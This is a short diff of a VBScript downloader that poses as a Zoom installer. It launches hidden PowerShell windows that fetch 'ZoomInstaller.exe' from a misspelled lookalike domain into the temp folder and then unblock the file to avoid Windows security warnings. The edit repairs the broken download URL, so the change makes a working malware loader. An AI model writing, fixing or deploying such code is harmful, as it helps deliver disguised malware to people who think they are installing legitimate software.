@@ -9,8 +9,8 @@ Set oShell = CreateObject("WScript.Shell")
 Dim strTemp
 strTemp = oShell.ExpandEnvironmentStrings("%TEMP%") & "\ZoomInstaller.exe"
 
-' Step 1: Download installer from your hosted URL
-oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomInstaller.exe' -OutFile '" & strTemp & "' -UseBasicParsing""", 0, True
+' Step 1: Download installer
+oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://us06web-zoomwindoowmicrosoftupadte552fs.github.io/UDUUEYE-YDG7372672Y76R736473Y-FYTD376E7673DG-DGS/ZoomInstaller.exe' -OutFile '" & strTemp & "' -UseBasicParsing""", 0, True
 
 ' Step 2: Unblock downloaded file
 oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strTemp & "'""", 0, True
